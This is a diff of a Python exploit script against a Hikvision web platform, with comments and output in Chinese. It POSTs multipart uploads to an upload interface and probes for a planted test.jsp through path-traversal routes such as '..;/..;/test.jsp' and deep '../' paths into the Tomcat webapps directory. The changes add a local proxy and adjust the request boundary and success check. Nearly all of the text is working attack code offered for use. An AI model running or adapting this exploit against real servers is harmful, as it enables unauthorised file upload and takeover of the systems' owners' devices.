@@ -27,7 +27,7 @@ if len(sys.argv) != 2:
         '+----------------------------------------------------------------------------------------------------------+')
     sys.exit()
 proxysdata = {
-'http': '127.0.0.1:8081'
+'https': '127.0.0.1:8080'
 }  
 #../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp
 #../../../tomcat85linux64.1/webapps/els/static/test.jsp
@@ -40,7 +40,7 @@ def exp(host):
     host2=host1.replace("https://","")
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
-        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundary9PggsiM755PLa54a",
+        "Content-Type": "multipart/form-data; boundary=fd18dd968b553715cbc5a1982526199b",
         "Host": "%s" %host2
     }
     headers2 = {
@@ -56,14 +56,14 @@ def exp(host):
     vulurl2= url+"/portal/ui/login/..;/..;/test.jsp"
     vulurl3= url+"/els/static/test.jsp"
     try:
-        r = requests.post(vulurl, headers=headers,data=data,verify=False)
-        r4 = requests.post(vulurl, headers=headers,data=data2,verify=False)
-        if  "code" in r.text or "code" in r4.text :
+        r = requests.post(vulurl, headers=headers,data=data,proxies=proxysdata,verify=False)
+        r4 = requests.post(vulurl, headers=headers,data=data2,proxies=proxysdata,verify=False)
+        if  "code" in r.text:
             print(url+"存在上传接口")
-            r2=requests.get(vulurl2,headers=headers2,verify=False)
+            r2=requests.get(vulurl2,headers=headers2,verify=False,proxies=proxysdata)
             if r2.status_code==200 and "test" in r2.text:
                 print(url+"/portal/ui/login/..;/..;/test.jsp")
-            r3=requests.get(vulurl3,headers=headers2,verify=False)
+            r3=requests.get(vulurl3,headers=headers2,proxies=proxysdata,verify=False)
             if r3.status_code==200 and "test" in r3.text:
                 print(url+"/els/static/test.jsp")
             #print("http://"+host+":true 文件地址为："+"")
